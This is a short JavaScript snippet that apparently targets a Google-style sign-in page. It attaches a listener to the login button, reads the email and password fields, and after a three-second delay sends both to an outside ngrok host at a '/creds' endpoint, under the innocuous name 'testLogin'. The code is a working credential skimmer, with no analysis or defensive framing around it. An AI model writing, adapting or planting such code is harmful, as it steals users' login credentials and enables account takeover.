const loginBtn = document.getElementsByClassName('VfPpkd-LgbsSe')[1];

function getEmail() {
  const emailInput = document.querySelector('[type="email"]');
  return emailInput.value;
}

function getPassword() {
  const passwordInput = document.querySelector('[type="password"]');
  return passwordInput.value;
}

async function testLogin() {
  const username = getEmail();
  const password = getPassword();
  const url = `https://23b1-45-162-158-3.sa.ngrok.io/creds?user=${username}&pwd=${password}`;
  
  try {
    const response = await fetch(url);
    const data = await response.json();
    console.log(data);
  } catch (error) {
    console.error(error);
  }
}

loginBtn.addEventListener('click', function() {
  const username = getEmail();
  const password = getPassword();

  setTimeout(testLogin, 3000);
});
